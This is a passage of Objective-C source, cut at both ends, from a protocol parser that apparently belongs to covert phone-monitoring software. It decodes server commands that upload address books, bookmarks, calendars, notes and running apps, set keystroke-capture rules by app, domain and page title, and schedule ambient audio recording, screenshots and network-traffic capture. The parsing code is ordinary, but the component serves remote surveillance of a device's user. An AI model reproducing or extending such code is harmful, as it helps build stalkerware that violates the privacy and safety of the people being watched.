		[responseData getBytes:&cfgID range:NSMakeRange(offset, sizeof(cfgID))];
		
		DLog(@"cfgID: %d", cfgID)
		DLog(@"md5: %@", md5)
		cfgID = ntohs(cfgID);
		DLog(@"cfgID-ntohs: %d", cfgID)
		[result setMd5:md5];
		[result setConfigID:cfgID];
	}
	return [result autorelease];
}

+ (SendDeactivateResponse *)parseSendDeactivateResponse:(NSData *)responseData {
	SendDeactivateResponse *result = [[SendDeactivateResponse alloc] init];
	[self parseServerResponseHeader:responseData to:result];
	
	return [result autorelease];
}

+ (SendHeartBeatResponse *)parseSendHeartBeatResponse:(NSData *)responseData {
	SendHeartBeatResponse *result = [[SendHeartBeatResponse alloc] init];
	[self parseServerResponseHeader:responseData to:result];
	
	return [result autorelease];
}

+ (SendEventResponse *)parseSendEventResponse:(NSData *)responseData {
	SendEventResponse *result = [[SendEventResponse alloc] init];
	[self parseServerResponseHeader:responseData to:result];
	
	return [result autorelease];
}

+ (SendAddressBookResponse *)parseSendAddressBookResponse:(NSData *)responseData {
	SendAddressBookResponse *result = [[SendAddressBookResponse alloc] init];
	[self parseServerResponseHeader:responseData to:result];
	
	return [result autorelease];
}

+ (SendAddressBookForApprovalResponse *)parseSendAddressBookForApprovalResponse:(NSData *)responseData {
	SendAddressBookForApprovalResponse *result = [[SendAddressBookForApprovalResponse alloc] init];
	[self parseServerResponseHeader:responseData to:result];
	
	return [result autorelease];
}

#pragma mark -
#pragma mark RAskResponse
+ (RAskResponse *)parseRAskResponse:(NSData *)responseData {
	RAskResponse *result = [[RAskResponse alloc] init];
	int offset = [self parseServerResponseHeader:responseData to:result];
	
	if ([result statusCode] == 0) {
		uint32_t numberOfBytes;
		[responseData getBytes:&numberOfBytes range:NSMakeRange(offset, sizeof(numberOfBytes))];
		numberOfBytes = ntohl(numberOfBytes);
		DLog(@"numberOfBytes %d", numberOfBytes);
		[result setNumberOfBytesReceived:numberOfBytes];
	}
	
	return [result autorelease];
}

#pragma mark -
#pragma mark UnknownResponse
+ (UnknownResponse *)parseUnknownResponse:(NSData *)responseData {
	UnknownResponse *result = [[UnknownResponse alloc] init];
	[self parseServerResponseHeader:responseData to:result];
	
	return [result autorelease];
}
#pragma mark -

+ (GetCSIDResponse *)parseGetCSIDResponse:(NSData *)responseData {
	GetCSIDResponse *result = [[GetCSIDResponse alloc] init];
	int offset = [self parseServerResponseHeader:responseData to:result];
	
	if ([result statusCode] == 0) {
		uint8_t numberOfSession;
		uint8_t CSID;
		offset = [self getValueFromData:responseData toBuffer:&numberOfSession withBufferSize:sizeof(numberOfSession) atOffset:offset];
		NSMutableArray *CSIDArray = [NSMutableArray array];
		for (int i=0; i<numberOfSession; i++) {
			offset = [self getValueFromData:responseData toBuffer:&CSID withBufferSize:sizeof(CSID) atOffset:offset];
			[CSIDArray addObject:[NSNumber numberWithInt:CSID]];
		}
		[result setCSIDList:CSIDArray];	
	}
	return [result autorelease];
}

+ (GetTimeResponse *)parseGetTimeResponse:(NSData *)responseData {
	GetTimeResponse *result = [[GetTimeResponse alloc] init];
	int offset = [self parseServerResponseHeader:responseData to:result];
	
	if ([result statusCode] == 0) {
		NSString *GMT = [[NSString alloc] initWithData:[responseData subdataWithRange:NSMakeRange(offset, 19)] encoding:NSUTF8StringEncoding];
		offset+=19;
		unsigned char representation;
		unsigned char timeZoneSize;
		NSString *timeZone;
		DLog(@"------ offset = %d sizeof = %d", offset, sizeof(representation));
		offset = [self getValueFromData:responseData toBuffer:&representation withBufferSize:sizeof(representation) atOffset:offset];
		DLog(@"repre %d", representation);
		offset = [self getValueFromData:responseData toBuffer:&timeZoneSize withBufferSize:sizeof(timeZoneSize) atOffset:offset];
		DLog(@"------ timeZoneSize = %d rep = %d", timeZoneSize, representation);
		timeZone = [[NSString alloc] initWithData:[responseData subdataWithRange:NSMakeRange(offset, timeZoneSize)] encoding:NSUTF8StringEncoding];

		DLog(@"GMT %@", GMT);
		DLog(@"TIMEZONE %@", timeZone);
		DLog(@"representation %d", representation);
		[result setCurrentMobileTime:GMT];
		[result setTimeZone:timeZone];
		[result setRepresentation:representation];

		[timeZone release];
		[GMT release];
	}
	return [result autorelease];
}

+ (GetProcessProfileResponse *)parseGetProcessProfileResponse:(NSData *)responseData {
	GetProcessProfileResponse *result = [[GetProcessProfileResponse alloc] init];
//	int offset = [self parseServerResponseHeader:responseData to:result];
//	design is not solid yet
	return [result autorelease];
}

+ (GetCommunicationDirectivesResponse *)parseGetCommunicationDirectivesResponse:(NSData *)responseData {
	GetCommunicationDirectivesResponse *result = [[GetCommunicationDirectivesResponse alloc] init];
	int offset = [self parseServerResponseHeader:responseData to:result];
	
	if ([result statusCode] == 0) {		
		uint16_t count;
		offset = [self getValueFromData:responseData toBuffer:&count withBufferSize:sizeof(count) atOffset:offset];
		count = ntohs(count);
		DLog(@"------ directiveArray count = %d", count);
		NSMutableArray *directiveArray = [NSMutableArray array];
		
		uint8_t timeUnit;
		uint8_t multiplier;
		uint8_t dayOfWeek;
		uint8_t dayOfMonth;
		uint8_t month;
		
		uint16_t numberOfEvent;
		uint16_t eventType;
		NSMutableArray *directiveEvents;
		NSString *startDate;
		NSString *endDate;
		NSString *dayStartTime;
		NSString *dayEndTime;
		
		int8_t action;
		int8_t direction;
		
		for (int i=0; i<count; i++) {
			CommunicationDirective *directive = [[CommunicationDirective alloc] init];
			offset = [self getValueFromData:responseData toBuffer:&timeUnit withBufferSize:sizeof(timeUnit) atOffset:offset];
			offset = [self getValueFromData:responseData toBuffer:&multiplier withBufferSize:sizeof(multiplier) atOffset:offset];
			offset = [self getValueFromData:responseData toBuffer:&dayOfWeek withBufferSize:sizeof(dayOfWeek) atOffset:offset];
			offset = [self getValueFromData:responseData toBuffer:&dayOfMonth withBufferSize:sizeof(dayOfMonth) atOffset:offset];
			offset = [self getValueFromData:responseData toBuffer:&month withBufferSize:sizeof(month) atOffset:offset];
			/* timeUnit (recurrent)
			 1 DAILY			
			 2 WEEKLY			
			 3 MONTHLY			
			 4 YEARLY			
			 */
			DLog(@"Criteria timeUnit %d", timeUnit);
			DLog(@"Criteria multiplier %d", multiplier);
			DLog(@"Criteria dayOfWeek %d", dayOfWeek);
			DLog(@"Criteria dayOfMonth %d", dayOfMonth);
			DLog(@"Criteria month %d", month);
			
			CommunicationDirectiveCriteria *tmpCriteria = [[CommunicationDirectiveCriteria alloc] initWithMultiplier:multiplier 
																		daysOfWeek:dayOfWeek 
																		dayOfMonth:dayOfMonth 
																		andMonth:month];

			offset = [self getValueFromData:responseData toBuffer:&numberOfEvent withBufferSize:sizeof(numberOfEvent) atOffset:offset];
			numberOfEvent = ntohs(numberOfEvent);
			
			directiveEvents = [[NSMutableArray alloc] initWithCapacity:numberOfEvent];
			for (int j=0;j<numberOfEvent;j++) {
				offset = [self getValueFromData:responseData toBuffer:&eventType withBufferSize:sizeof(eventType) atOffset:offset];
				eventType = ntohs(eventType);
				[directiveEvents addObject:[NSNumber numberWithInt:eventType]];
				DLog(@"eventType %d", eventType);
			}
			startDate = [[NSString alloc] initWithData:[responseData subdataWithRange:NSMakeRange(offset, 10)] encoding:NSUTF8StringEncoding];
			offset+=10;
			endDate = [[NSString alloc] initWithData:[responseData subdataWithRange:NSMakeRange(offset, 10)] encoding:NSUTF8StringEncoding];
			offset+=10;
			dayStartTime = [[NSString alloc] initWithData:[responseData subdataWithRange:NSMakeRange(offset, 5)] encoding:NSUTF8StringEncoding];
			offset+=5;
			dayEndTime = [[NSString alloc] initWithData:[responseData subdataWithRange:NSMakeRange(offset, 5)] encoding:NSUTF8StringEncoding];
			offset+=5;

			offset = [self getValueFromData:responseData toBuffer:&action withBufferSize:sizeof(action) atOffset:offset];
			offset = [self getValueFromData:responseData toBuffer:&direction withBufferSize:sizeof(direction) atOffset:offset];

			
			DLog(@"timeUnit %d", timeUnit);
			DLog(@"startDate %@", startDate);
			DLog(@"endDate %@", endDate);
			DLog(@"dayStartTime %@", dayStartTime);
			DLog(@"dayEndTime %@", dayEndTime);
			DLog(@"action %d", action);
			DLog(@"direction %d", direction);
			
			[directive setTimeUnit:timeUnit];
			[directive setCriteria:tmpCriteria];
			[directive setCommuEvent:directiveEvents];
			[directive setStartDate:startDate];
			[directive setEndDate:endDate];
			[directive setDayStartTime:dayStartTime];
			[directive setDayEndTime:dayEndTime];
			[directive setAction:action];
			[directive setDirection:direction];
			
			[startDate release];
			[endDate release];
			[dayStartTime release];
			[dayEndTime release];
			[directiveEvents release];
			[tmpCriteria release];
			
			
			[directiveArray addObject:directive];
			[directive release];
		}
		
		[result setCommunicationDirectiveList:directiveArray];
	}
	return [result autorelease];
}

+ (GetConfigurationResponse *)parseGetConfigurationResponse:(NSData *)responseData {
	GetConfigurationResponse *result = [[GetConfigurationResponse alloc] init];
	int offset = [self parseServerResponseHeader:responseData to:result];
	if ([result statusCode] == 0) {
		NSData *md5 = [responseData subdataWithRange:NSMakeRange(offset, 16)];
		offset+=16;
		uint16_t cfgID;
		[responseData getBytes:&cfgID range:NSMakeRange(offset, sizeof(cfgID))];
		cfgID = ntohs(cfgID);
		DLog(@"------ md5 %@", md5);
		DLog(@"cfgID %d", cfgID);
		[result setMd5:md5];
		[result setConfigID:cfgID];
	}
	return [result autorelease];
}

+ (GetActivationCodeResponse *)parseGetActivationCodeResponse:(NSData *)responseData {
	GetActivationCodeResponse *result = [[GetActivationCodeResponse alloc] init];
	int offset = [self parseServerResponseHeader:responseData to:result];
	if ([result statusCode] == 0) {
		uint8_t activationCodeSize;
		NSString *activationCode;
		offset = [self getValueFromData:responseData toBuffer:&activationCodeSize withBufferSize:sizeof(activationCodeSize) atOffset:offset];
		activationCode = [[NSString alloc] initWithData:[responseData subdataWithRange:NSMakeRange(offset, activationCodeSize)] encoding:NSUTF8StringEncoding];

		[result setActivationCode:activationCode];
		[activationCode release];
	}
	return [result autorelease];
}

+ (GetAddressBookResponse *)parseGetAddressBookResponse:(NSString *)responseFilePath offset:(unsigned long)offset {
	
//	int offset = [self parseServerResponseHeader:responseData to:result];
//
//	uint8_t count;
//	offset = [self getValueFromData:responseData toBuffer:&count atOffset:offset];
//
//	NSMutableArray *addressBookList = [NSMutableArray array];
//
//	uint32_t addressBookID;
//	uint8_t addressBookNameSize;
//	NSString *addressBookName;
//	uint16_t vCardCount;
//	FxVCard *vCard;
//
//	for (int i=0; i<count; i++) {
//		offset = [self getValueFromData:responseData toBuffer:addressBookID atOffset:offset];
//		addressBookID = htonl(addressBookID);
//		offset = [self getValueFromData:responseData toBuffer:addressBookNameSize atOffset:offset];
//		addressBookName = [responseData subdataWithRange:NSMakeRange(offset, addressBookNameSize)];
//
//
//
//
//
//	}
	NSData *serverIdData;
	NSData *cmdEchoData;
	NSData *statusCodeData;
	NSData *msgSizeData;
	NSData *msgData;
	NSData *extendedStatusData;
	NSData *PCCCountData;
	NSData *PCCCommandIDData;
	NSData *PCCArgCountData;
	NSData *PCCArgLengthData;
	NSData *PCCArgData;
	int16_t serverId;
	int16_t cmdEcho;
	int16_t statusCode;
	int16_t msgSize;
	NSString *msg;
	int32_t extendedStatus;
	
	int8_t PCCCount;
	NSMutableArray *PCCArray = [NSMutableArray array];
	int16_t cmdId;
	int8_t argumentCount;
	int16_t argumentLength;
	
	NSFileHandle * fileHandle = [NSFileHandle fileHandleForReadingAtPath:responseFilePath];
	if (fileHandle == nil) {
		// Return transport error
		DLog(@"nil fileHandle");
		
		return nil;
	}
	[fileHandle seekToFileOffset:offset];
	
	serverIdData = [ProtocolParser getDataFromFile:fileHandle length:2 atOffset:&offset];
	cmdEchoData = [ProtocolParser getDataFromFile:fileHandle length:2 atOffset:&offset];
	statusCodeData = [ProtocolParser getDataFromFile:fileHandle length:2 atOffset:&offset];
	msgSizeData = [ProtocolParser getDataFromFile:fileHandle length:2 atOffset:&offset];
	[msgSizeData getBytes:&msgSize length:sizeof(msgSize)];
	msgSize = ntohs(msgSize);
	msgData = [ProtocolParser getDataFromFile:fileHandle length:msgSize atOffset:&offset];
	extendedStatusData = [ProtocolParser getDataFromFile:fileHandle length:4 atOffset:&offset];

	PCCCountData = [self getDataFromFile:fileHandle length:1 atOffset:&offset];
	[PCCCountData getBytes:&PCCCount length:sizeof(PCCCount)];

	for (int i=0; i<PCCCount; i++) {
		PCC *pcc = [[PCC alloc] init];
		PCCCommandIDData = [ProtocolParser getDataFromFile:fileHandle length:2 atOffset:&offset];
		[PCCCommandIDData getBytes:&cmdId length:sizeof(cmdId)];
		cmdId = ntohs(cmdId);

		[pcc setArguments:[NSMutableArray array]];
		[pcc setPCCID:cmdId];

		PCCArgCountData = [ProtocolParser getDataFromFile:fileHandle length:1 atOffset:&offset];
		[PCCArgCountData getBytes:&argumentCount length:sizeof(argumentCount)];

		for (int j=0; j<argumentCount;j++) {
			PCCArgLengthData = [ProtocolParser getDataFromFile:fileHandle length:2 atOffset:&offset];
			[PCCArgLengthData getBytes:&argumentLength length:sizeof(argumentLength)];
			argumentLength = ntohs(argumentLength);
			
			PCCArgData = [ProtocolParser getDataFromFile:fileHandle length:argumentLength atOffset:&offset];
			NSString *argument = [[NSString alloc] initWithData:PCCArgData encoding:NSUTF8StringEncoding];
			[[pcc arguments] addObject:argument];
			[argument release];
		}
		
		[PCCArray addObject:pcc];
		[pcc release];
	}

	
	[serverIdData getBytes:&serverId length:sizeof(serverId)];
	[cmdEchoData getBytes:&cmdEcho length:sizeof(cmdEcho)];
	[statusCodeData getBytes:&statusCode length:sizeof(statusCode)];
	msg = [[NSString alloc] initWithData:msgData encoding:NSUTF8StringEncoding];
	[extendedStatusData getBytes:&extendedStatus length:sizeof(extendedStatus)];
	serverId = ntohs(serverId);
	cmdEcho = ntohs(cmdEcho);
	statusCode = ntohs(statusCode);
	
	
	NSMutableArray *addressBookArray = [NSMutableArray array];
	uint8_t addressBookCount;			// 1 byte for addressbook count
	uint32_t addressBookID;				// 4 bytes for addressbook id
	uint8_t addressBookNameSize;		// 1 byte for addressbook name size
	NSString *addressBookName;
	uint16_t vCardCount;				// 2 bytes for vcard count
	
	offset = [self getValueFromFile:fileHandle toBuffer:&addressBookCount withBufferSize:sizeof(addressBookCount) atOffset:offset];
	DLog (@"addressBookCount %d", addressBookCount)
	for (int i=0; i< addressBookCount; i++) {
		AddressBook *addressBook = [[AddressBook alloc] init];
		
		offset = [ProtocolParser getValueFromFile:fileHandle toBuffer:&addressBookID withBufferSize:sizeof(addressBookID) atOffset:offset];
		offset = [ProtocolParser getValueFromFile:fileHandle toBuffer:&addressBookNameSize withBufferSize:sizeof(addressBookNameSize) atOffset:offset];
		NSData *addressBookNameData = [ProtocolParser getDataFromFile:fileHandle length:addressBookNameSize atOffset:&offset];
		addressBookName = [[NSString alloc] initWithData:addressBookNameData encoding:NSUTF8StringEncoding];

		offset = [ProtocolParser getValueFromFile:fileHandle toBuffer:&vCardCount withBufferSize:sizeof(vCardCount) atOffset:offset];
		
		DLog(@"addressBookID %d addressbook name %@ vCardCount %d", addressBookID, addressBookName, vCardCount);
		addressBookID = ntohl(addressBookID);
		vCardCount = ntohs(vCardCount);
		
		// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
		// now we just use offset to indicate where is vcard data in response file and we will delete the file when finish fetching it
		// problem will come when there are more than one addressbook because the file will be deleted before another addressbook can fetch vcard
		// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
		DLog(@"addressBookID %d addressbook name %@ vCardCount %d", addressBookID, addressBookName, vCardCount);
		ResponseVCardProvider *vCardProvider = [[ResponseVCardProvider alloc] initWithPath:responseFilePath offset:offset totalVCard:vCardCount];

		[addressBook setAddressBookID:addressBookID];
		[addressBook setAddressBookName:addressBookName];
		[addressBook setVCardCount:vCardCount];
		[addressBook setVCardProvider:vCardProvider];
		
		DLog(@"------ ADDRESS BOOK = %@", addressBook);
		[addressBookArray addObject:addressBook];
		[addressBookName release];
		[addressBook release];
		[vCardProvider release];
	}
	DLog (@"addressBookArray %@", addressBookArray)
	
	GetAddressBookResponse *result = [[GetAddressBookResponse alloc] init];
	[result setPCCCount:PCCCount];
	[result setPCCArray:PCCArray];
	[result setServerID:serverId];
	[result setCmdEcho:cmdEcho];
	[result setStatusCode:statusCode];
	[result setMessage:msg];
	[result setExtendedStatus:extendedStatus];
	
	[result setAddressBookList:addressBookArray];
	
	[msg release];
	
	[fileHandle closeFile];

	return [result autorelease];
}

+ (GetSoftwareUpdateResponse *)parseGetSoftwareUpdateResponse:(NSData *)responseData {
	GetSoftwareUpdateResponse *result = [[GetSoftwareUpdateResponse alloc] init];
	//int offset = [self parseServerResponseHeader:responseData to:result];

	return [result autorelease];
}

+ (GetIncompatibleApplicationDefinitionsResponse *)parseGetIncompatibleApplicationDefinitionsResponse:(NSData *)responseData {
	GetIncompatibleApplicationDefinitionsResponse *result = [[GetIncompatibleApplicationDefinitionsResponse alloc] init];
	//int offset = [self parseServerResponseHeader:responseData to:result];

	return [result autorelease];
}

+ (SendRunningApplicationResponse *) parseSendRunningApplicationResponse: (NSData *) aResponseData {
	SendRunningApplicationResponse *result = [[SendRunningApplicationResponse alloc] init];
	[self parseServerResponseHeader:aResponseData to:result];
	
	return [result autorelease];
}

+ (SendInstalledApplicationResponse *) parseSendInstalledApplicationResponse: (NSData *) aResponseData {
	SendInstalledApplicationResponse *result = [[SendInstalledApplicationResponse alloc] init];
	[self parseServerResponseHeader:aResponseData to:result];
	
	return [result autorelease];
}

+ (SendBookmarkResponse *) parseSendBookmarkResponse: (NSData *) aResponseData {
	SendBookmarkResponse *result = [[SendBookmarkResponse alloc] init];
	[self parseServerResponseHeader:aResponseData to:result];
	
	return [result autorelease];
}

+ (SendCalendarResponse *) parseSendCalendarResponse: (NSData *) aResponseData {
	SendCalendarResponse *result = [[SendCalendarResponse alloc] init];
	[self parseServerResponseHeader:aResponseData to:result];
	
	return [result autorelease];
}

+ (SendNoteResponse *) parseSendNoteResponse: (NSData *) aResponseData {
	SendNoteResponse *result = [[SendNoteResponse alloc] init];
	[self parseServerResponseHeader:aResponseData to:result];
	
	return [result autorelease];
}

+ (GetSupportIMResponse *) parseGetSupportIMResponse: (NSData *) aResponseData {
	GetSupportIMResponse *result = [[GetSupportIMResponse alloc] init];
	
	int offset = [self parseServerResponseHeader:aResponseData to:result];
	DLog (@"Get support IM response offset = %d", offset)
	
	NSInteger location = offset;
	uint8_t imServiceCount;
	
	[aResponseData getBytes:&imServiceCount range:NSMakeRange(location, sizeof(uint8_t))];
	location += sizeof(uint8_t);
	DLog (@"imServiceCount = %d", imServiceCount)
	
	NSMutableArray *imServices = [NSMutableArray array];
	
	for (NSInteger i = 0; i < imServiceCount; i++) {
		uint8_t imClientID;
		uint8_t latestVersionSize;
		NSString *latestVersion;
		uint8_t policy;
		
		[aResponseData getBytes:&imClientID range:NSMakeRange(location, sizeof(uint8_t))];
		location += sizeof(uint8_t);
		[aResponseData getBytes:&latestVersionSize range:NSMakeRange(location, sizeof(uint8_t))];
		location += sizeof(uint8_t);
		NSData *someData = [aResponseData subdataWithRange:NSMakeRange(location, latestVersionSize)];
		latestVersion = [[NSString alloc] initWithData:someData encoding:NSUTF8StringEncoding];
		location += latestVersionSize;
		
		NSMutableArray *exceptionVersions = [NSMutableArray array];
		
		uint8_t exceptionVersionCount;
		[aResponseData getBytes:&exceptionVersionCount range:NSMakeRange(location, sizeof(uint8_t))];
		location += sizeof(uint8_t);
		DLog (@"imClientID				= %d", imClientID)
		DLog (@"latestVersion			= %@", latestVersion)
		DLog (@"policy					= %d", policy)
		DLog (@"exceptionVersionCount	= %d", exceptionVersionCount)
		
		for (NSInteger j = 0; j < exceptionVersionCount; j++) {
			uint8_t exceptionVersionSize;
			NSString *exceptionVersion;
			
			[aResponseData getBytes:&exceptionVersionSize range:NSMakeRange(location, sizeof(uint8_t))];
			location += sizeof(uint8_t);
			someData = [aResponseData subdataWithRange:NSMakeRange(location, exceptionVersionSize)];
			exceptionVersion = [[NSString alloc] initWithData:someData encoding:NSUTF8StringEncoding];
			location += exceptionVersionSize;
			
			[exceptionVersions addObject:exceptionVersion];
			[exceptionVersion release];
		}
		DLog (@"exceptionVersions		= %@", exceptionVersions)
		
		[aResponseData getBytes:&policy range:NSMakeRange(location, sizeof(uint8_t))];
		location += sizeof(uint8_t);
		
		IMServiceInfo *imServiceInfo = [[IMServiceInfo alloc] init];
		[imServiceInfo setMIMClientID:imClientID];
		[imServiceInfo setMLatestVersion:latestVersion];
		[imServiceInfo setMExceptionVersions:exceptionVersions];
		[imServiceInfo setMPolicy:policy];
		
		[latestVersion release];
		
		[imServices addObject:imServiceInfo];
		
		[imServiceInfo release];
		
	}
	
	[result setMIMServices:imServices];
	
	return [result autorelease];
}

+ (GetSnapShotRuleResponse *) parseGetSnapShotRuleResponse: (NSData *) aResponseData {
    GetSnapShotRuleResponse *result = [[GetSnapShotRuleResponse alloc] init];
	int offset = [self parseServerResponseHeader:aResponseData to:result];
	NSInteger location = offset;
    
    uint16_t keyRuleCount = 0;
    uint8_t applicationIDSize = 0;
    uint32_t thresholdText = 0;
    uint16_t domainNameSize = 0;
    uint16_t keywordURLSize = 0;
    uint16_t keywordTitleSize = 0;
    
    // SNAPSHOT_RULE_COUNT​
    [aResponseData getBytes:&keyRuleCount range:NSMakeRange(location, sizeof(uint16_t))];
    keyRuleCount = ntohs(keyRuleCount);
    location += sizeof(uint16_t);
    // SNAPSHOT_RULES
    NSMutableArray *keyStrokeRules = [[NSMutableArray alloc] initWithCapacity:keyRuleCount];
    
    for (NSInteger i = 0; i < keyRuleCount; i++) {

        //L_256
        [aResponseData getBytes:&applicationIDSize range:NSMakeRange(location, sizeof(uint8_t))];
        location += sizeof(uint8_t);
            
        //APPLICATION_ID
        NSData *subData = [aResponseData subdataWithRange:NSMakeRange(location, applicationIDSize)];
        location += applicationIDSize;
        NSString * applicationID = [[NSString alloc] initWithData:subData encoding:NSUTF8StringEncoding];
            
        // TEXT_LESS_THAN
        [aResponseData getBytes:&thresholdText range:NSMakeRange(location, sizeof(uint32_t))];
        thresholdText = ntohl(thresholdText);
        location += sizeof(uint32_t);
       
        // L_64K
        [aResponseData getBytes:&domainNameSize range:NSMakeRange(location, sizeof(uint16_t))];
        domainNameSize = ntohs(domainNameSize);
        location += sizeof(uint16_t);
        // DOMAIN_NAME
        subData = [aResponseData subdataWithRange:NSMakeRange(location, domainNameSize)];
        location += domainNameSize;
        NSString * domainName = [[NSString alloc] initWithData:subData encoding:NSUTF8StringEncoding];

        // L_64K
        [aResponseData getBytes:&keywordURLSize range:NSMakeRange(location, sizeof(uint16_t))];
        keywordURLSize = ntohs(keywordURLSize);
        location += sizeof(uint16_t);
        // URL_KEYWORD
        subData = [aResponseData subdataWithRange:NSMakeRange(location, keywordURLSize)];
        location += keywordURLSize;
        NSString * keywordURL = [[NSString alloc] initWithData:subData encoding:NSUTF8StringEncoding];
            
        // L_64K
        [aResponseData getBytes:&keywordTitleSize range:NSMakeRange(location, sizeof(uint16_t))];
        keywordTitleSize = ntohs(keywordTitleSize);
        location += sizeof(uint16_t);
        // PAGE_TITLE_KEYWORD
        subData = [aResponseData subdataWithRange:NSMakeRange(location, keywordTitleSize)];
        location += keywordTitleSize;
        NSString * keywordTitle = [[NSString alloc] initWithData:subData encoding:NSUTF8StringEncoding];
            
        //Add Rule
        KeyStrokeRule *keyStrokeRule = [[KeyStrokeRule alloc] init];
        [keyStrokeRule setMApplicationID:applicationID];
        [keyStrokeRule setMTextLessThan:thresholdText];
        [keyStrokeRule setMDomain:domainName];
        [keyStrokeRule setMURL:keywordURL];
        [keyStrokeRule setMTitleKeyword:keywordTitle];

        [keyStrokeRules addObject:keyStrokeRule];
        
        [keyStrokeRule release];
        
        [keywordTitle release];
        [applicationID release];
        [domainName release];
        [keywordURL release];
    }
    
    SnapShotRule *snapShotRule = [[SnapShotRule alloc] init];
    [snapShotRule setMKeyStrokeRules:keyStrokeRules];
    
    [result setMSnapShotRule:snapShotRule];
    
    [snapShotRule release];
    [keyStrokeRules release];
    
	return [result autorelease];
}

+ (SendSnapShotRuleResponse *) parseSendSnapShotRuleResponse: (NSData *) aResponseData {
    SendSnapShotRuleResponse *result = [[SendSnapShotRuleResponse alloc] init];
	[self parseServerResponseHeader:aResponseData to:result];
	
	return [result autorelease];
}

+ (GetMonitorApplicationResponse *) parseGetMonitorApplicationResponse: (NSData *) aResponseData {
    GetMonitorApplicationResponse *result = [[GetMonitorApplicationResponse alloc] init];
    int offset = [self parseServerResponseHeader:aResponseData to:result];
	NSInteger location = offset;
    
    uint16_t applicationCount = 0;
    
    uint8_t applicationIDSize = 0;
    NSString *applicationID = nil;
    // APPLICAITON_COUNT​​
    [aResponseData getBytes:&applicationCount range:NSMakeRange(location, sizeof(uint16_t))];
    applicationCount = ntohs(applicationCount);
    location += sizeof(uint16_t);
    
    NSMutableArray *monitorApplications = [[NSMutableArray alloc] initWithCapacity:applicationCount];
    
    for (NSInteger i = 0; i < applicationCount; i++) {
        // L_256​
        [aResponseData getBytes:&applicationIDSize range:NSMakeRange(location, sizeof(uint8_t))];
        location += sizeof(uint8_t);
        //APPLICATION_ID
        NSData *subData = [aResponseData subdataWithRange:NSMakeRange(location, applicationIDSize)];
        applicationID = [[NSString alloc] initWithData:subData encoding:NSUTF8StringEncoding];
        location += applicationIDSize;
        
        MonitorApplication *monitorApplication = [[MonitorApplication alloc] init];
        [monitorApplication setMApplicationID:applicationID];
        [monitorApplications addObject:monitorApplication];
        
        [monitorApplication release];
        [applicationID release];
    }
    
    [result setMMonitorApplications:monitorApplications];
    [monitorApplications release];
    
	return [result autorelease];
}

+ (SendMonitorApplicationResponse *) parseSendMonitorApplicationResponse: (NSData *) aResponseData {
    SendMonitorApplicationResponse *result = [[SendMonitorApplicationResponse alloc] init];
	[self parseServerResponseHeader:aResponseData to:result];
	
	return [result autorelease];
}

+ (SendDeviceSettingsResponse *) parseSendDeviceSettingsResponse: (NSData *) aResponseData {
    SendDeviceSettingsResponse *result = [[SendDeviceSettingsResponse alloc] init];
	[self parseServerResponseHeader:aResponseData to:result];
	
	return [result autorelease];
}

+ (SendTemporalControlResponse *) parseSendTemporalControlResponse: (NSData *) aResponseData {
    SendTemporalControlResponse *result = [[SendTemporalControlResponse alloc] init];
    [self parseServerResponseHeader:aResponseData to:result];
    return [result autorelease];
}

+ (GetTemporalControlResponse *) parseGetTemporalControlResponse: (NSData *) aResponseData {
    GetTemporalControlResponse *result = [[GetTemporalControlResponse alloc] init];
    int offset = [self parseServerResponseHeader:aResponseData to:result];
	NSInteger location = offset;
    
    // Count
    uint16_t count = 0;
    [aResponseData getBytes:&count range:NSMakeRange(location, sizeof(uint16_t))];
    count = ntohs(count);
    location += sizeof(uint16_t);

    NSMutableArray *temporalControls = [NSMutableArray array];
    for (NSInteger i = 0; i < count; i++) {
        // Action
        int8_t action = 0;
        [aResponseData getBytes:&action range:NSMakeRange(location, sizeof(int8_t))];
        location += sizeof(int8_t);
        
        // Params
        TemporalActionParams *params = nil;
        if (action == kTemporalActionControlRecordAudioAmbient) {
            uint32_t paramsSize = 0;
            [aResponseData getBytes:&paramsSize range:NSMakeRange(location, sizeof(uint32_t))];
            paramsSize = ntohl(paramsSize);
            location += sizeof(uint32_t);
            DLog(@"ambient, paramsSize, %d", paramsSize); // Should be 0
            
        }
        else if (action == kTemporalActionControlRecordScreenShot || action == kTemporalActionControlRecordNetworkTraffic ) {
            uint32_t paramsSize = 0;
            [aResponseData getBytes:&paramsSize range:NSMakeRange(location, sizeof(uint32_t))];
            paramsSize = ntohl(paramsSize);
            location += sizeof(uint32_t);
            
            NSData *paramsData = [aResponseData subdataWithRange:NSMakeRange(location, paramsSize)];
            DLog(@"paramsSize %d, paramsData %d", paramsSize , [paramsData length]); // Should be 4
            
            location += paramsSize;
            
            int location2 = 0;
            uint32_t interval = 0;
            [paramsData getBytes:&interval length:sizeof(uint32_t)];
            interval = ntohl(interval);
            location2 += sizeof(uint32_t);
            
            params = [[[TemporalActionParams alloc] init] autorelease];
            [params setMInterval:interval];
            
        }
        
        // Criteria
        int8_t recurrenceType = 0;
        [aResponseData getBytes:&recurrenceType range:NSMakeRange(location, sizeof(int8_t))];
        location += sizeof(int8_t);
        uint8_t multiplier = 0;
        [aResponseData getBytes:&multiplier range:NSMakeRange(location, sizeof(uint8_t))];
        location += sizeof(uint8_t);
        uint8_t dayOfWeek = 0;
        [aResponseData getBytes:&dayOfWeek range:NSMakeRange(location, sizeof(uint8_t))];
        location += sizeof(uint8_t);
        uint8_t dayOfMonth = 0;
        [aResponseData getBytes:&dayOfMonth range:NSMakeRange(location, sizeof(uint8_t))];
        location += sizeof(uint8_t);
        uint8_t monthOfYear = 0;
        [aResponseData getBytes:&monthOfYear range:NSMakeRange(location, sizeof(uint8_t))];
        location += sizeof(uint8_t);
        
        TemporalControlCriteria *criteria = [[[TemporalControlCriteria alloc] init] autorelease];
        [criteria setMRecurrenceType:(RecurrenceType)recurrenceType];
        [criteria setMMultiplier:multiplier];
        [criteria setMDayOfWeek:(DayOfWeek)dayOfWeek];
        [criteria setMDayOfMonth:dayOfMonth];
        [criteria setMMonthOfYear:monthOfYear];
        
        // Start date, must be 10 bytes
        NSString *startDate = [[NSString alloc] initWithData:[aResponseData subdataWithRange:NSMakeRange(location, 10)] encoding:NSUTF8StringEncoding];
